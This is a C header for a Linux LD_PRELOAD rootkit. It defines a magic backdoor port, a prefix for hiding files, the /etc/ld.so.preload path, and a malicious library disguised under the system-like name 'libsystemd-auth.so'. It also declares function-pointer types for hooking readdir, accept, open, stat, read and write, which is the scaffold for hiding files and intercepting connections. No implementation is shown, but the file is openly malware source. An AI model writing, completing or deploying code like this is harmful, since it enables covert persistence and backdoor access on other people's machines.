#ifndef ROOTKIT_H
#define ROOTKIT_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

#define MAGIC_PORT 58231
#define HIDDEN_PREFIX "7fd5bc27_735a_4172-9d66_d94c102fc43f"
#define PRELOAD_FILE "/etc/ld.so.preload"
#define EVIL_LIB "libsystemd-auth.so"

typedef struct dirent *(*orig_readdir_t)(DIR *);
typedef int (*orig_accept_t)(int, struct sockaddr *, socklen_t *);
typedef int (*orig_accept4_func_type)(int, struct sockaddr *, socklen_t *, int);
typedef ssize_t (*orig_write_t)(int, const void *, size_t);
typedef int (*orig_open_t)(const char *, int, ...);
typedef int (*orig_stat_t)(const char *, struct stat *);
typedef int (*orig_xstat_t)(int, const char *, struct stat *);
typedef ssize_t (*orig_read_t)(int, void *, size_t);

#endif